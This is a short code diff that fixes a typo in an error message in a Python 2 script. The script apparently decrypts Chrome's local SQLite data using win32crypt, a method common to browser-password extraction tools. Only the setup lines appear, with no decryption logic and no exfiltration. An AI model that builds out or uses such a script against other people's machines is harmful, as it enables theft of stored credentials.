@@ -2,7 +2,7 @@ import sqlite3, win32crypt, os, sys
 
 def decrypt(path, save_path):
 	if not os.path.isfile(path):
-		print 'The file doesn\'t exists!'
+		print 'The file doesn\'t exist!'
 		return
 	
 	connChrome = sqlite3.connect(path)
